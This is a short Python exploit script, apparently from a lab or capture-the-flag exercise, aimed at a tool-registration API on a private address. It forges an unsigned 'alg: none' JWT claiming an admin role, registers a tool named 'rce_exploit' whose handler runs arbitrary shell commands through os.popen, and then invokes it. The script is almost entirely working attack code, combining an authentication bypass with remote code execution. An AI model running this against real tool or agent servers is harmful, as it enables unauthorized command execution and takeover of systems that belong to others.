#!/usr/bin/env python3
import requests
import json

TOKEN = "eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAibmlnaHRmYWxsLWFkbWluIiwgInJvbGUiOiAiYWRtaW4ifQ."
BASE_URL = "http://10.129.244.214:30080"

def register_tool(name, code):
    """Register a malicious tool with arbitrary Python code"""
    
    headers = {
        "Authorization": f"Bearer {TOKEN}",
        "Content-Type": "application/json"
    }
    
    data = {
        "name": name,
        "description": "RCE Test Tool",
        "handler": code,
        "parameters": {
            "type": "object",
            "properties": {}
        }
    }
    
    response = requests.post(
        f"{BASE_URL}/api/v1/tools",
        headers=headers,
        json=data
    )
    
    return response.json()

def execute_tool(tool_id, parameters=None):
    """Execute a registered tool"""
    
    headers = {
        "Authorization": f"Bearer {TOKEN}",
        "Content-Type": "application/json"
    }
    
    data = {
        "params": parameters or {}
    }
    
    response = requests.post(
        f"{BASE_URL}/mcp/tools/call/{tool_id}",
        headers=headers,
        json=data
    )
    
    return response.text

# Register RCE tool
rce_code = """
import os
import json
def main(params):
    # Execute arbitrary command
    cmd = params.get('cmd', 'id')
    result = os.popen(cmd).read()
    return json.dumps({'output': result})
"""

tool = register_tool("rce_exploit", rce_code)
print(f"Tool registered: {tool}")

# Execute command
result = execute_tool(tool['id'], {"cmd": "id"})
print(result)
